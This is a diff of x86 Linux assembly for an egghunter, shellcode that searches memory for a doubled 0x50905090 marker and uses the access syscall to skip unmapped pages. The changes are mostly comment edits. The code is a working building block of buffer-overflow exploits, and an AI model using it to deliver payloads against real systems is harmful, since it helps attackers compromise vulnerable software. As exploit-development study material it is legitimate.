@@ -19,14 +19,13 @@ _start:
 
 next_page:
 
-	or dx,0xfff         ; edx = 0x00000fff  Memory allignement
+	or dx,0xfff         ; Set 0x?????000 Memory alignment, next inc instruction +0x1000
 
 next_address:
-	
-	inc edx             ; edx + 1 (at first pass 0x00001000
+
+	inc edx             ; edx + 1
 	lea ebx,[edx+0x4]   ; load edx +4 in ebx
-;	push byte +0x21
-;	pop eax
+
 	xor eax, eax        ; Clear eax
 	mov al, 0x21        ; eax = 0x00000021 = 33
 	int 0x80            ; sys_access
@@ -35,7 +34,7 @@ next_address:
 	jz next_page        ; if EFAULT jump to nextpage
 
 	mov eax,0x50905090  ; Set egg: X,NOP,X,NOP
-	mov edi,edx         ;
+	mov edi,edx         ; Move edx pointer in edi for comparison
 	scasd               ; Compare EAX with doubleword at ES:(E)DI and set status flags
 	jnz next_address    ; If not second egg jump to next address
 	scasd               ; Compare EAX with doubleword at ES:(E)DI and set status flags
